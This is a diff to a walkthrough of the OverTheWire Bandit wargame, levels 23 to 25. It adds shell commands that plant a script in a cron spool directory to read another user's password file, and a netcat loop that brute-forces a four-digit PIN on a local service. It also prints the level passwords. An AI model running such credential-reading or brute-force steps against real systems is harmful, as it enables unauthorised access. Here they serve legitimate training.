@@ -372,30 +372,57 @@ done
 
 bandit23@bandit:~$ mkdir -p /tmp/poli
 bandit23@bandit:~$ cd /tmp/poli
-bandit23@bandit:/tmp/poli$ touch pass.sh
-bandit23@bandit:/tmp/poli$ chmod 777 pass.sh
-bandit23@bandit:/tmp/poli$ nano pass.sh
-```
 
-```sh
-#!/bin/bash
-cat /etc/bandit_pass/bandit24 > /tmp/poli/pass
-```
+echo '#!/bin/bash' > /tmp/poli/my_script.sh
+echo 'cat /etc/bandit_pass/bandit24 > /tmp/bandit23_pass.txt' >> /tmp/poli/my_script.sh
 
-```sh
-bandit23@bandit:/tmp/poli$ chmod +rx pass.sh
-bandit23@bandit:/tmp/poli$ chmod 777 /tmp/poli
-bandit23@bandit:/tmp/poli$ touch pass
-bandit23@bandit:/tmp/poli$ chmod +rwx pass
-bandit23@bandit:/tmp/poli$ cp pass.sh /var/spool/bandit24/foo/pass.sh
-bandit23@bandit:/tmp/poli$ cat pass
+chmod +x /tmp/poli/my_script.sh
+
+cp /tmp/poli/my_script.sh /var/spool/bandit24/foo/
+
+cat /tmp/bandit23_pass.txt
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
 ```
 
 # Level 24 → Level 25
 
 ssh -p 2220 bandit24@bandit.labs.overthewire.org
 
+```sh
+bandit24@bandit:/tmp$ mktemp -d
+/tmp/tmp.zoH1sk6a1R
+bandit24@bandit:/tmp$ cd /tmp/tmp.zoH1sk6a1R
+bandit24@bandit:/tmp/tmp.zoH1sk6a1R$ touch brute_force_pin.sh
+bandit24@bandit:/tmp/tmp.zoH1sk6a1R$ chmod +x brute_force_pin.sh
+bandit24@bandit:/tmp/tmp.zoH1sk6a1R$ nano brute_force_pin.sh
+```
+
+````sh
+#!/bin/bash
+
+for i in {0000..9999}
+do
+        echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> possibilities.txt
+done
+
+cat possibilities.txt | nc localhost 30002 > result.txt```
+````
+
+```sh
+bandit24@bandit:/tmp/tmp.zoH1sk6a1R$ ./brute_force_pin.sh
+bandit24@bandit:/tmp/tmp.zoH1sk6a1R$ ls
+brute_force_pin.sh  possibilities.txt  result.txt
+bandit24@bandit:/tmp/tmp.zoH1sk6a1R$ sort result.txt | grep -v "Wrong!"
+
+Correct!
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+bandit24@bandit:/tmp/tmp.zoH1sk6a1R$
+```
+
 # Level 25 → Level 26
+
+ssh -p 2220 bandit25@bandit.labs.overthewire.org
 
 # Level 26 → Level 27
 
